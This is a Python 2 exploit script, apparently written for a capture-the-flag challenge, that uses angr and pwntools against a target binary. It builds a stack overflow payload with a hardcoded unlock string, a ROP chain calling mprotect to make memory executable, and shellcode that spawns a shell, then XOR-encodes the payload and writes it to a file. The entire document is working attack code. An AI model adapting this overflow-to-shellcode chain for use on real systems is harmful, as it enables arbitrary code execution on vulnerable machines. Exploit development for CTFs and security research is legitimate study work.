
#!/usr/bin/env python2
import angr
import find
import sys
from pwn import *

context(arch = 'amd64')

tar = sys.argv[1]

# Find dynamic elements in file
loc = find.get_addresses(tar)

"""
# Create symbolic buffer
p = angr.Project(tar)
buf = angr.claripy.BVS("buf",48*8)
start_state = p.factory.blank_state(addr=loc['start'])
start_state.memory.store(loc['buf'], buf)

# Setup a stack frame
start_state.regs.rbp = start_state.regs.rsp
start_state.regs.rsp = start_state.regs.rsp - 0x50
start_state.memory.store(start_state.regs.rsp, start_state.se.BVV(0, 8*0x32))

# Setup stepper
pg = p.factory.path_group(start_state)
def step_func(pg):
    print pg
    pg.drop(filter_func = lambda path: path.addr == loc['avoid'])
    pg.stash(filter_func = lambda path: path.addr == loc['target'], from_stash='active', to_stash='found')
    return pg
pg.step(step_func = step_func, until = lambda pg: len(pg.found) > 0)
print pg.errored
f = pg.found[0]
print f.state
cert = f.state.se.any_str(buf)
"""

# FIXED

# Create killstring
# cert = '45a64da71bf41084a13d7c2812be721eafc52945ce14815f239b42139e4ff78561cdec4936174ddc288ae81dab39f636'.decode('hex')
cert = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')
print cert.encode('hex')

# Payload layout
mprotect_offset = 0x200
shellcode_offset = 0x300

# Calculate addresses
mprotect_addr = loc['buf_loc'] + mprotect_offset
shellcode_addr = loc['buf_loc'] + shellcode_offset
print 'Mprotect arguments @ 0x%x' % mprotect_addr
print 'Shellcode @ 0x%x' % shellcode_addr

# First RIP override (load gadget)
kill = ''
kill += cyclic(loc['overflow_size'], alphabet = 'ABCD')
kill += p64(mprotect_addr + loc['load_offset'])
kill += p64(loc['load_gadget'])

# Setup mprotect arguments
shellcode_address = loc['buf_loc'] + shellcode_offset
page = shellcode_address & 0xFFFFFFFFFFFFF000
print 'Page = 0x%x' % page
kill += cyclic(mprotect_offset - len(kill), n = 8) # Pad payload
kill += p64(page)                           # RDI
kill += p64(0x1338)                         # junk (RCX)
kill += p64(0x1337)                         # junk (R8)
kill += p64(0x10000)                        # RSI
kill += p64(0x7)                            # RDX
kill += p64(page)                           # RAX (sometimes RDI <- RAX)

# Run primary rop chain
kill += cyclic(loc['load_offset'] - 0x30, n = 8)   # Get to RBP (RBP now points here)
kill += p64(loc['buf_loc'] + 0x600)
kill += p64(loc['plt_mprotect'])
kill += p64(shellcode_address)

# Shellcode
kill += cyclic(shellcode_offset - len(kill), n = 8)
kill += asm(shellcraft.sh())

# Write payload
payload = xor(cert + kill, loc['pad'], cut = 'max')
write('sploit', payload.encode('hex'))
